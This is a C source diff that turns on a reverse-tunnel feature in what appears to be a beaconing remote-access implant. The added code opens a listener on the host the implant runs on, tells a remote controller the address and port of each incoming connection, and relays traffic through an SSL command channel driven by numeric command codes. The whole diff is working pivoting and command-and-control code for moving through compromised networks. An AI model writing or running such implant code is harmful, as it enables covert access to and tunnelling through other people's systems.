@@ -225,7 +225,7 @@ int tunnel(SSL *ssl) {
   }
   // Second branch is a reverse tunnel 
   else if (strcmp((char *)ans, "52") == 0) {
-    //return reverse_tunnel(ssl, efd);
+    return reverse_tunnel(ssl, efd);
   } 
   // We should not hit this but if we do send an error message and recover back to waiting for a new command
   else { 
@@ -269,9 +269,7 @@ int forward_tunnel(SSL *ssl, int efd) {
 
   // Read in the target address and port from the client.
   if (ssl_readall(ssl, (uint8_t *)addr, sizeof(addr)) < 0) {return FAIL;}
-  /////printf("[*] Address of %s\n", addr);
   if (ssl_readall(ssl, (uint8_t *)port, sizeof(port)) < 0) {return FAIL;}
-  /////printf("[*] port of %s\n", port);
 
   // Register the default descriptor to track - ssl in this case
   event.data.fd = ssl_fd;
@@ -361,112 +359,172 @@ int forward_tunnel(SSL *ssl, int efd) {
  * shutdown the tunnel, or it detects a read/write error on either of the sockets. In the event of 
  * a socket error while in the loop the server will revert to its beaconing behavior.
  */
-/*
 int reverse_tunnel(SSL *ssl, int efd) {
   int res;
+  int len;
+  int sport;
+  int sfd, ffd;
   int keepcnt = 5;
   int keepidle = 30; 
   int keepintvl = 30;
   int keepalive = 1;
   int n, max = 128;
-  int efd, sfd, ffd;
-  size_t readin = 0;
-  size_t written = 0;
-  uint8_t ans[4] = {0};
+  int ssl_fd = SSL_get_fd(ssl);
+  uint8_t port[7] = {0};
+  uint8_t tarport[7] = {0};
+  uint8_t ans[16] = {0};
   uint8_t buf[4096] = {0};
-  char port[6];
-  char addr[INET6_ADDRSTRLEN];
+  char taraddr[INET6_ADDRSTRLEN];
+  struct timeval timeout;      
   struct epoll_event event;
   struct epoll_event *events;
+  struct sockaddr_storage peer;   
+  struct sockaddr_storage target;       
+  socklen_t socklen = sizeof(target);     
+  socklen_t peerlen;                      
 
   // Buffer for the events to be tracked
   if ((events = calloc(max, sizeof(event))) == NULL) {
+    if (ssl_writeall(ssl, (uint8_t *)"531", 4) < 0) {return FAIL;}
     return FAIL;
   }
 
-  // Tell the client that we are about to setup a reverse tunnel
+  // Tell the client that we are about to setup a forward tunnel
   if (ssl_writeall(ssl, (uint8_t *)"520", 4) < 0) {return FAIL;}
 
-  // Open a listener on the server waithing for traffic
-  if (setuplistner(port, sfd) != SUCCESS) {return FAIL;}
+  // Read the listening port into memory
+  if (ssl_readall(ssl, (uint8_t *)port, 7) < 0) {return FAIL;}
 
-  // Register the default descriptor to track - sfd in this case
+  // Setup the listner
+  if (setuplistener(atoi((char *)port), &sfd) != SUCCESS) {return FAIL;}
+
+  // Register the default descriptor to track - ssl in this case
   event.data.fd = sfd;
   event.events = EPOLLIN | EPOLLET;
-  if (poll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) == -1) {return FAIL;}
+  if (epoll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) == -1) {return FAIL;}
+
+  // Add the event to the event queue - client socket
+  memset(&event, 0, sizeof(event));
+  event.data.fd = ssl_fd;
+  event.events = EPOLLIN | EPOLLET;
+  if (epoll_ctl(efd, EPOLL_CTL_ADD, ssl_fd, &event) == -1) {goto loop_fail;}
 
   // Enter into the reverse tunnel loop
-  while(1) {      
+  while(1) {
     // Wait for events 
     n = epoll_wait(efd, events, max, -1);
 
     // Loop over the alerts
-    for (size_t i = 0; i < n; i++) {
+    for (int i = 0; i < n; i++) {
       if (events[i].events & EPOLLERR || events[i].events & EPOLLHUP || (!events[i].events & EPOLLIN)) {
         close(events[i].data.fd);
-        goto failure;
+        return FAIL;
       } 
-      // Handle inbound connections 
-      else if (sfd == events[i].data.fd) {
+      // This branch handles inbound connections
+      else if (sfd == events[i].data.fd) { 
         // Accept the connection
-        if ((ffd == accept(sfd, (struct sockaddr *)&target, &socklen)) < 0) {return FAIL;}
+        if ((ffd = accept(sfd, (struct sockaddr *)&target, &socklen)) < 0) {goto loop_fail;}
         
         // Set keepalives
-        if (setsockopt(ffd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {return FAIL;}
-        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {return FAIL;}
-        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {return FAIL;}
-        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {return FAIL;}
+        if (setsockopt(ffd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {goto loop_fail;}
+        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {goto loop_fail;}
+        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {goto loop_fail;}
+        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {goto loop_fail;}
+
+        // Set socket timeout values
+        timeout.tv_sec = 0;
+        timeout.tv_usec = 250;
+        if (setsockopt(ffd, SOL_SOCKET, SO_RCVTIMEO, (void *)&timeout, sizeof(timeout)) < 0) {goto loop_fail;}
+        if (setsockopt(ffd, SOL_SOCKET, SO_SNDTIMEO, (void *)&timeout, sizeof(timeout)) < 0) {goto loop_fail;}
 
         // Put the socket into non-blocking mode
-        if (fcntl(ffd, F_SETFL, O_NONBLOCK) < 0) {return FAIL};
-          
+        if (fcntl(ffd, F_SETFL, O_NONBLOCK) < 0) {goto loop_fail;}
+
+        // Get who we are speaking to
+        peerlen = sizeof(peer);
+        getpeername(ffd, (struct sockaddr*)&peer, &peerlen);
+        if (peer.ss_family == AF_INET) {
+          struct sockaddr_in *p = (struct sockaddr_in *)&peer;
+          sport = ntohs(p->sin_port);
+          inet_ntop(AF_INET, &p->sin_addr, taraddr, sizeof(taraddr));
+        } else { // AF_INET6
+          struct sockaddr_in6 *p = (struct sockaddr_in6 *)&peer;
+          sport = ntohs(p->sin6_port);
+          inet_ntop(AF_INET6, &p->sin6_addr, taraddr, sizeof(taraddr));
+        } 
+
         // Add the event to the event queue - connected socket
-        memset(event, 0, sizeof(event));
+        memset(&event, 0, sizeof(event));
         event.data.fd = ffd;
         event.events = EPOLLIN | EPOLLET;
-        if (poll_ctl(efd, EPOLL_CTL_ADD, ffd, &event) == -1) {return FAIL;}
+        if (epoll_ctl(efd, EPOLL_CTL_ADD, ffd, &event) == -1) {goto loop_fail;}
 
-        // Add the event to the event queue - client socket
-        memset(event, 0, sizeof(event));
-        event.data.fd = ssl;
-        event.events = EPOLLIN | EPOLLET;
-        if (poll_ctl(efd, EPOLL_CTL_ADD, ssl, &event) == -1) {return FAIL;}
-
-        // Message the client to alert them to the new connection
-        ssl_writeall(ssl, (uint8_t *)"521", 4);
-      } 
-      // This branch handles incoming data from the target to the tunnel
+        // Let the client know we recieved a connection
+        if (ssl_writeall(ssl, (uint8_t *)"521", 4) < 0) {goto loop_fail;}
+        if (ssl_writeall(ssl, (uint8_t *)taraddr, sizeof(taraddr)) < 0) {goto loop_fail;}
+        sprintf((char *)tarport, "%d", sport);
+        if (ssl_writeall(ssl, (uint8_t *)tarport, sizeof(tarport)) < 0) {goto loop_fail;}
+      }
+      // This branch handles incoming data the remote target
       else if (ffd == events[i].data.fd) {
-        if ((ssl_writeall(ssl, (uint8_t *)"522", 4) < 0) {goto alert_fail;}
+        // Clear the buffers
         memset(buf, 0, sizeof(buf));
-        res = readall(ffd, buf, sizeof(buf), &readin)
+        memset(ans, 0, sizeof(ans));
+        // Read the size of the message
+        res = read(ffd, buf, sizeof(buf));
         if (res < 0) {
-          goto alert_fail;
+          if (errno != EAGAIN || errno != EWOULDBLOCK) {
+            goto loop_fail;
+          }
+          continue;
         } else if (res == 0) {
           ssl_writeall(ssl, (uint8_t *)"523", 4);
+          close(ffd);
           continue;
         }
-        if ((ssl_writeall(ssl, buf, sizeof(buf) < 0) {goto alert_fail;}
-        } 
-        // This branch should not be reached fail, and resume beaconing
-        else { 
-          return FAIL;
-        }
-      } // This branch handles incoming data from the client side tunnel target
-      else if (ssl == events[i].data.fd) { 
-        ssl_readall
+        // Tell the client we are still connected
+        if (ssl_writeall(ssl, (uint8_t *)"522", 4) < 0) {goto loop_fail;}
+        // Tell the client to expect the following size packet
+        sprintf((char *)ans, "%d", res);
+        if (ssl_writeall(ssl, (uint8_t *)ans, sizeof(ans)) < 0) {goto loop_fail;}
+        // Deliver the message
+        if (ssl_writeall(ssl, buf, res) < 0) {goto loop_fail;}
+      }
+      // This branch handles incoming data the local target
+      else if (ssl_fd) {
+        // Clear the buffers
         memset(buf, 0, sizeof(buf));
-        if ((ssl_readall(ssl, buf, sizeof(buf), &readin) < 0) {goto alert_fail;}
-        if ((writeall(ffd, buf, sizeof(buf) < 0) {goto alert_fail;}
-      } 
+        memset(ans, 0, sizeof(ans));
+        // Read into memory the size of message
+        if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {goto loop_fail;}
+        if (strcmp((char *)ans, "E514") == 0) {
+          close(ffd);
+          close(sfd);
+          free(events);              
+          return SUCCESS;
+        }
+        len = atoi((char *)ans);
+        // Echo the messages from the target back to our connected socket
+        if (ssl_readall(ssl, buf, len) < 0) {goto loop_fail;}
+        if (writeall(ffd, buf, len) < 0) {goto loop_fail;}
+      }
       // We should never hit this branch but if we do just see if we can carry on.
       else {  
-        continue;
+        continue;   
       } // Done checking specific event
     } // Done checking updated events
   } // Loop for reverse tunnel
+
+  loop_fail:
+  if (ffd > 0) {
+    close(ffd);
+  }
+  if (sfd > 0) {
+    close(sfd);
+  }
+  free(events);
+  return FAIL;
 }
-*/
 
 /**
  * Set the time to sleep between each beacon the server will send. On error revert to the
@@ -662,7 +720,6 @@ ssize_t writeall(int fd, uint8_t *buf, size_t len) {
   return w;
 }
 
-
 /**
  * Resolve and connect an address and port connection. Setup socket timeouts and keepalives as well.
  * Ensure that the resulting socket is set to non-blocking mode.
@@ -722,8 +779,7 @@ int resolveandconnect(int *sockfd, int8_t *addr, int port) {
 /**
  * Set up a listening socket on a specified port
  */
-/*
-int setuplistner(int port, int *sockfd) {
+int setuplistener(int port, int *sockfd) {
   int status;
   int optval = 1;
   char portstr[6];
@@ -778,7 +834,7 @@ int setuplistner(int port, int *sockfd) {
   // The socket is now listening and ready to be utilized
   return SUCCESS; 
 }
-*/
+
 /**
  * Helping function to intialize SSL helper libraries and establish contexts
  */
